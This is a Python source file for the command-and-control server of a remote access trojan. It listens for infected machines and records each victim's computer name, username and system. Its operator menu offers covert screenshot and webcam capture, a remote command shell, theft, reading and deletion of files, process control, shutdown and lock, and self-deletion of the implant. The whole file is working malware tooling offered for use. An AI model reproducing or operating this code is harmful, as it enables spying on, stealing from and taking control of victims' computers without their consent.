# Standard Libraries
from prettytable import PrettyTable
import threading
import socket
import time
import os
import re

# Third-Party Libraries
import webapi

port = 5005
buffer = 16384

clients = []
clientInfo = []

table = PrettyTable()
table.field_names = ["ID", "Computer", "IP Address", "Username", "System", "File"]

send = lambda data: client.send(bytes(data, "utf-8"))
recv = lambda buf: client.recv(buffer)

def sendAll(data):
    if (isinstance(data, bytes)):
        client.send(bytes(str(len(data)), "utf-8"))
        if (conn_stream()):
            client.send(data)
    else:
        data = str(data, "utf-8")
        send(str(len(data)), "utf-8")
        if (conn_stream()):
            send(data)

def recvAll(bufsize):
    data = bytes()

    send("success")
    while (len(data) < int(bufsize)):
        data += recv(int(bufsize))
    return data

def recvAll_Verbose(bufsize):
    data = bytes()

    send("success")
    while (len(data) < int(bufsize)):
        data += recv(int(bufsize))
        print("Receiving: {:,} / {:,} Bytes\r".format(len(data), int(bufsize)), end="")
    return data

def conn_stream():
    if (b"success" in client.recv(buffer)):
        return True

def RemoteConnect():
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    objSocket.bind(("0.0.0.0", port))
    objSocket.listen(socket.SOMAXCONN)

    while (True):
        try:
            conn, address = objSocket.accept()
            clients.append(conn)

            serverDetails = str(conn.recv(buffer), "utf-8").split("\n")
            temp = {}

            temp["computer"] = serverDetails[0]
            temp["username"] = serverDetails[1]
            temp["system"] = serverDetails[2]
            temp["file"] = serverDetails[3]
            temp["ip"] = address[0]
            temp["port"] = address[1]
            clientInfo.append(temp)

        except socket.error:
            objSocket.close()
            del(objSocket)
            RemoteConnect()

def ConnectionCommands():
    print("______________________________________________________")
    print("(Connection Commands)                                 |\n" + \
          "                                                      |")
    print("[clients]         View Connected Clients              |")
    print("[connect <id>]    Connect to Client                   |")
    print("[close <id>]      Terminate Connection                |")
    print("[delete <id>]     Kill Connection & Delete Program    |")
    print("[closeall]        Terminates All Connections          |")
    print("______________________________________________________|")

def ClientCommands():
    print("______________________________________")
    print("(Connection Commands)                 |\n" + \
          "                                      |")
    print("[-apc] Append Connection              |")
    print("______________________________________|")
    print("(User Interface Commands)             |\n" + \
          "                                      |")
    print("[-vmb] Send Message (VBS-Box)         |")
    print("[-cps] Capture Screenshot             |")
    print("[-cpw] Capture Webcam                 |")
    print("[-cwp] Change Wallpaper               |")
    print("______________________________________|")
    print("(System Commands)                     |\n" + \
          "                                      |")
    print("[-vsi] View System Information        |")
    print("[-vrt] View Running Tasks             |")
    print("[-idt] Idle Time                      |")
    print("[-stp] Start Process                  |")
    print("[-klp] Kill Process                   |")
    print("[-rms] Remote CMD                     |")
    print("[-wkc] Wake Computer                  |")
    print("[-sdc] Shutdown Computer              |")
    print("[-rsc] Restart Computer               |")
    print("[-lkc] Lock Computer                  |")
    print("______________________________________|")
    print("(File Commands)                       |\n" + \
          "                                      |")
    print("[-gcd] Get Current Directory          |")
    print("[-vwf] View Files                     |")
    print("[-sdf] Send File                      |")
    print("[-rvf] Receive File                   |")
    print("[-rdf] Read File                      |")
    print("[-mvf] Move File                      |")
    print("[-dlf] Delete File                    |")
    print("[-dld] Delete Directory               |")
    print("______________________________________|\n")

def VBSMessageBox(connection, message):
    # message = input("\nType Message: ").strip()
    print(clients[connection], message)

    if (len(message) >= 1000):
        print("[-] Maximum Length: 1000 Characters")

    elif not (len(message) <= 0):
        clients[connection].send(b"msgbox")
        if (conn_stream()):
            clients[connection].send(bytes(message, "utf-8"))

    print(str(recv(buffer), "utf-8") + "\n")

def CaptureScreenshot():
    send("screenshot")

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to Capture Screenshot\n")
        return

    start = time.time()
    print("\nScreenshot Captured")
    try:
        fileContent = recvAll_Verbose(recv(buffer))
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation Error - File May be too Large")

        with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
            ImageFile.write(fileContent)

        end = time.time()
        print("\n\nImage has been Received\nSize: " +
            "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            len(fileContent) / 1024, len(fileContent), end - start))

    except MemoryError as e:
        print(e)

    except: print("[!] Error Receiving File\n")

def CaptureWebcam():
    send("webcam")

    devices = str(recv(1024), "utf-8")
    if (devices == "NO_WEBCAMS"):
        print("<No Webcams Detected>\n")
        return

    cameras = 1
    for device in devices.split("\n"):
        if (len(device) == 0):
            continue

        print(f"{cameras}. {device}")
        cameras += 1

    try:
        cameraID = input("\nChoose Device: ").strip()
        if not int(cameraID) in range(1, cameras):
            print("Unrecognized Webcam ID\n")
            raise ValueError

        send(str(cameraID))

        duration = int(input("Capture Duration? (seconds): ").strip())
        if (duration < 1 or duration > 30):
            print("Duration Range: 1-30 seconds\n")
            raise ValueError

        send(str(duration * 1000))

    except ValueError:
        send("0")
        return

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to Capture Webcam\n")
        return

    start = time.time()
    print("\nWebcam Captured")
    try:
        fileContent = recvAll_Verbose(recv(buffer))
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation - File is too Large\n")

        with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.avi"), "wb") as ImageFile:
            ImageFile.write(fileContent)

        end = time.time()
        print("\n\nVideo has been Received\nSize: " +
            "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            len(fileContent) / 1024, len(fileContent), end - start))

    except MemoryError as e:
        print(e)

    except: print("[!] Error Receiving File\n")

def ChangeWallpaper():
    localFile = input("\nChoose Local Image File: ").strip()
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return

    elif not (re.search(re.compile("[^\\s]+(.*?)\\.(jpg|jpeg|png)$"), localFile)):
        print("[!] Invalid File Type - Required: (JPEG, JPG, PNG)\n")
        return

    send("wallpaper")
    if (conn_stream()):
        send(os.path.basename(localFile))

    with open(localFile, "rb") as ImageFile:
        fileContent = ImageFile.read()

    print("Sending Image...")
    sendAll(fileContent)

    if not (str(recv(buffer), "utf-8") == "received"):
        print("[!] Unable to Transfer Image\n")
        return

    print("Wallpaper Changed\n")

def SystemInformation():
    print(f"\nConnection ID:   <{clients.index(client)}>")
    print(f"Computer:        <{PC_Name}>")
    print(f"Username:        <{PC_Username}>")
    print(f"IP Address:      <{IP_Address}>")
    print(f"System:          <{PC_System}>\n")

def ViewTasks():
    send("tasklist")
    print(str(recvAll(recv(buffer)), "utf-8"))

def IdleTime():
    send("idletime")
    print(str(recv(buffer), "utf-8") + "\n")

def StartProcess():
    process = input("\nRemote File Path: ").strip()
    send("stprocess")
    if (conn_stream()):
        send(process)

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return

    print(str(recv(buffer), "utf-8") + "\n")

def KillProcess():
    process = input("\nTask to Kill: ").strip()
    send("klprocess")
    if (conn_stream()):
        send(process)

    print(str(recvAll(recv(buffer)), "utf-8"))

def RemoteCMD():
    send("remote")
    remoteDirectory = str(recv(buffer), "utf-8")

    while (True):
        try:
            command = input(f"\n({IP_Address} ~ {remoteDirectory})> ").strip().lower()
            if (command == "exit"):
                raise KeyboardInterrupt

            elif (command == "cls" or command == "clear"):
                os.system("clear" if os.name == "posix" else "cls")

            elif ("start" in command or "tree" in command or "cd" in command or 
                    "cmd" in command or "powershell" in command):

                print("[!] Unable to use this Command")

            elif (len(command) > 0):
                send(command)
                output = str(recvAll(recv(buffer)), "utf-8")

                if (len(output) == 0):
                    print("No Output ~ Command Executed")
                else:
                    print(output, end="")

        except KeyboardInterrupt:
            send("exit"); print("<Exited Remote CMD>\n")
            break

def WakeComputer():
    send("wake-computer")
    if (str(recv(buffer), "utf-8") == "success"):
        print("Computer has been woken\n")

def ShutdownComputer():
    send("shutdown")
    print(f"Powering Off PC ~ [{IP_Address}]\n")

def RestartComputer():
    send("restart")
    print(f"Restarting PC ~ [{IP_Address}]\n")

def LockComputer():
    send("lock")
    print(f"Locking PC ~ [{IP_Address}]\n")

def CurrentDirectory():
    send("directory")
    print(str(recv(buffer), "utf-8").replace("\\", "/") + "\n")

def ViewFiles():
    directory = input("\nRemote Folder [-filter]: ").strip()
    send("files")
    if (conn_stream()):
        send(directory)

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote Directory\n")
        return

    clientFiles = recvAll(recv(buffer)).split(b"\n")
    fileCount = -1
    files = str()

    for file in clientFiles:
        try:
            files += str(file, "utf-8") + "\n"
            fileCount += 1
        except UnicodeDecodeError:
            pass

    if (fileCount <= 0):
        print("[!] No Results\n")
    else:
        print("File Count: [{:,}]\nCharacter Count: [{:,}]\n\n{}".format(fileCount, len(files), files), end="")

def SendFile():
    localFile = input("\nLocal File Path: ").strip()
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return
        
    send("receive")
    if (conn_stream()):
        send(os.path.basename(localFile))

    with open(localFile, "rb") as file:
        fileContent = file.read()
        
    start = time.time()

    print("Sending File...")
    sendAll(fileContent)

    if not (str(recv(buffer), "utf-8") == "received"):
        print("[!] Unable to Transfer File\n")
        return

    end = time.time()
    
    print("\nFile Sent: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
        (os.path.basename(localFile)), len(fileContent) / 1024, len(fileContent), end - start))
        
def ReceiveFile():
    filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
    send("send")
    if (conn_stream()):
        send(filePath)

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return
        
    start = time.time()
    try:
        fileContent = recvAll_Verbose(recv(buffer))
        fileName = filePath.split("\\")[-1]
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation - File is too Large\n")

        with open(fileName, "wb") as RemoteFile:
            RemoteFile.write(fileContent)

        end = time.time()
        print("\n\nFile Received: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            fileName, len(fileContent) / 1024, len(fileContent), end - start))

    except MemoryError as e:
        print(e)
    
    except: print("[!] Error Receiving File\n")

def ReadFile():
    filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
    send("read")
    if (conn_stream()):
        send(filePath)

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return
        
    start = time.time()
    try:
        fileContent = recvAll_Verbose(recv(buffer))
        fileName = filePath.split("\\")[-1]
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation - File is too Large\n")

        end = time.time()
        print("\n\nFile Read: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            fileName, len(fileContent) / 1024, len(fileContent), end - start))

        print("="*100 + f"\n{str(fileContent, 'utf-8')}\n" + "="*100 + "\n")

    except UnicodeDecodeError:
        print("Unable to Display Binary File in Terminal.\nFile has been Downloaded.\n")
        with open(fileName, "wb") as RemoteFile:
            RemoteFile.write(fileContent)

    except MemoryError as e:
        print(e)

    except: print("[!] Error Reading File\n")

def MoveFile():
    send("move")

    filePath = input("\nSelect Remote File: ").strip()
    remoteDirectory = input("\nNew Remote Directory Location: ").strip()

    send(filePath)
    if (conn_stream()):
        send(remoteDirectory)

    clientResponse = str(recv(buffer), "utf-8")
    if (clientResponse == "invalid-file"):
        print("[!] Unable to find Remote File\n")
        return

    elif (clientResponse == "invalid-directory"):
        print("[!] Unable to find Remote Directory\n")
        return

    else: print("File has been Moved\n")

def DeleteFile():
    filePath = input("\nRemote File Path: ").strip()
    send("delfile")
    if (conn_stream()):
        send(filePath)

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return

    print(str(recv(buffer), "utf-8") + "\n")

def DeleteDirectory():
    directory = input("\nRemote Directory: ").strip()
    send("deldir")
    if (conn_stream()):
        send(directory)

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote Directory\n")
        return

    print(str(recv(buffer), "utf-8") + "\n")

def adjustTable():
    table.clear_rows()

    for client in clients:
        connection = int(clients.index(client))
        network = client.getpeername()

        table.add_row([
            str(connection),
            clientInfo[connection]['computer'],
            network[0] + ":" + str(network[1]),
            clientInfo[connection]['username'],
            clientInfo[connection]['system'],
            clientInfo[connection]['file']
        ])

def SelectConnection():
    while (True):
        try:
            command = input("\n-> ").lower().strip()
            if (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")
                
            elif (command == "?" or command == "help"):
                ConnectionCommands()

            elif (command == "clients"):
                if (len(clients) == 0):
                    print("<Connections Appear Here>")
                    continue

                temp = []
                for client in clients:
                    try:
                        client.send(b"test")
                        if (client.recv(buffer) == b"success"):
                            continue

                    except ConnectionResetError:
                        temp.append(client)

                for deadClient in temp:
                    dead = int(clients.index(deadClient))

                    if (deadClient in clients):
                        table.del_row(dead)
                        clients.remove(deadClient)
                        del(clientInfo[dead])
                        deadClient.close()
                
                adjustTable()
                if not (len([t for t in table]) == 0):
                    print(table)

            elif (command.split(" ")[0] == "connect"):
                connection = int(command.split(" ")[1])
                client = clients[connection]
                try:
                    client.send(b"test")
                    if (client.recv(buffer) == b"success"):
                        RemoteControl(connection)

                except ConnectionResetError:
                    del(clientInfo[int(clients.index(client))])
                    clients.remove(client)
                    print(f"Failed to Connect: {client.getpeername()[0]}")

            elif (command.split(" ")[0] == "close"):
                connection = int(command.split(" ")[1])
                client = clients[connection]

                try:
                    client.send(b"terminate")
                except ConnectionResetError:
                    pass
                finally:
                    print(f"{client.getpeername()[0]} has been Terminated")
                    del(clientInfo[connection])
                    clients.remove(client)
                    client.close()

            elif (command.split(" ")[0] == "delete"):
                connection = int(command.split(" ")[1])
                client = clients[connection]

                if (input(f"Delete Program off Client {clients.index(client)}'s Computer? (y/n): ").lower().strip() == "y"):
                    try:
                        client.send(b"delself")
                        if (str(client.recv(buffer), "utf-8") == "success"):
                            print(f"Program has been Deleted off Remote Computer ~ [{client.getpeername()[0]}]")

                    except ConnectionResetError:
                        print("Lost Connection to Client: " + client.getpeername()[0])

                    finally:
                        del(clientInfo[connection])
                        clients.remove(client)
                        client.close()

            elif (command == "closeall"):
                if (input("Are you sure? (y/n): ").lower() == "y"):
                    try:
                        for client in clients:
                            client.send(b"terminate")
                            client.close()

                    except ConnectionResetError: pass
                    finally:
                        print(f"All Connections Terminated: [{len(clients)}]")
                        clients.clear()

        except (ValueError, IndexError):
            print("Invalid Connection ID")

        except (ConnectionAbortedError, BrokenPipeError):
            print("[Clients Timed Out] - Reconnecting...")
            for client in clients:
                client.close()

            clients.clear()

        except KeyboardInterrupt:
            break

        finally:
            webapi.app.current = None
            if (len(clients) == 0):
                clientInfo.clear()

def RemoteControl(connection):
    global current, client, IP_Address, PC_Name, PC_Username, PC_System

    webapi.app.current = connection
    client = clients[connection]
    IP_Address = clientInfo[connection]['ip']
    PC_Name = clientInfo[connection]['computer']
    PC_Username = clientInfo[connection]['username']
    PC_System = clientInfo[connection]['system']

    print(f"Connected: {PC_Name}/{IP_Address} ({clients.index(client)})\n")
    while (True):
        try:
            command = input(f"({PC_Name})> ").lower().strip()
            if (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")

            elif (command == "?" or command == "help"):
                ClientCommands()
                
            elif (command == "-apc"):
                print(f"Appended Connection ~ [{IP_Address}]")
                break

            elif (command == "-vmb"):
                VBSMessageBox()

            elif (command == "-cps"):
                CaptureScreenshot()

            elif (command == "-cpw"):
                CaptureWebcam()

            elif (command == "-cwp"):
                ChangeWallpaper()

            elif (command == "-vsi"):
                SystemInformation()

            elif (command == "-vrt"):
                ViewTasks()

            elif (command == "-idt"):
                IdleTime()

            elif (command == "-stp"):
                StartProcess()

            elif (command == "-klp"):
                KillProcess()

            elif (command == "-rms"):
                RemoteCMD()

            elif (command == "-wkc"):
                WakeComputer()

            elif (command == "-sdc"):
                ShutdownComputer()

            elif (command == "-rsc"):
                RestartComputer()
            
            elif (command == "-lkc"):
                LockComputer()

            elif (command == "-gcd"):
                CurrentDirectory()

            elif (command == "-vwf"):
                ViewFiles()

            elif (command == "-sdf"):
                SendFile()
                
            elif (command == "-rvf"):
                ReceiveFile()

            elif (command == "-rdf"):
                ReadFile()

            elif (command == "-mvf"):
                MoveFile()

            elif (command == "-dlf"):
                DeleteFile()

            elif (command == "-dld"):
                DeleteDirectory()

        except KeyboardInterrupt:
            print("\n[Keyboard Interrupted ~ Connection Appended]")
            break

        except Exception as e:
            print(f"\n[-] Lost Connection to ({IP_Address})\n" + f"Error Message: {e}")
            clients.remove(client)
            del(clientInfo[connection])
            client.close()
            break

webapi.app.clients = clients
webapi.app.clientInfo = clientInfo
webapi.app.VBSMessageBox = VBSMessageBox
webapi.app.clients_lock = threading.Lock()

t1 = threading.Thread(target=RemoteConnect)
t1.daemon = True
t1.start()

t2 = threading.Thread(target=webapi.app.run)
t2.daemon = True
t2.start()

SelectConnection()